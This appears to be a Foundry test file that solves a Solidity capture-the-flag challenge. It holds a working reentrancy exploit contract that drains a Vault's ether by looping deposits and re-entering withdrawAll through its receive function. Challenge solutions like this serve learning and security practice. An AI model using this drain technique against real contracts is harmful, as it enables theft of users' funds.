// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        playerAddress = makeAddr("player");
        setup = new Setup{value: 10000 ether}();
        vm.deal(playerAddress, 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);

        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        new Attack(address(setup.vault())).attack{value:1 ether}();

        ////////// YOUR CODE END //////////

        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();

        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);
    }
}

////////// YOUR CODE GOES HERE //////////
contract Attack {
    bool reentrant;
    // bool check;
    Vault c;
    mapping(address=>uint256) public balanceOf;
    constructor(address vaultaddress) {

        c=Vault(vaultaddress);

    }

    function attack() public payable {
        // c.deposit{value:1 ether}();
        // check=false;
        while(address(c).balance>=address(this).balance){
            c.deposit{value:address(this).balance}();
            c.withdrawAll();
            reentrant=false;
        }
        c.deposit{value:address(c).balance}();
        // reentrant=true;
        c.withdrawAll();

        // check=true;
        (bool success,)=msg.sender.call{value:address(this).balance}("");
        require(success);
    }
    receive() external payable{
        if(reentrant==false){
            // if(check==false){
            reentrant=true;

            c.withdrawAll();
        }

    //     if(address(c).balance != 0){
    //         c.withdrawAll();
    //         // (bool success,)=address(c).call{value:address(this).balance}(c.deposit,);
    //         // require(success);
    //         // // ??
    // // }
    //     }

    }


}
////////// YOUR CODE END //////////
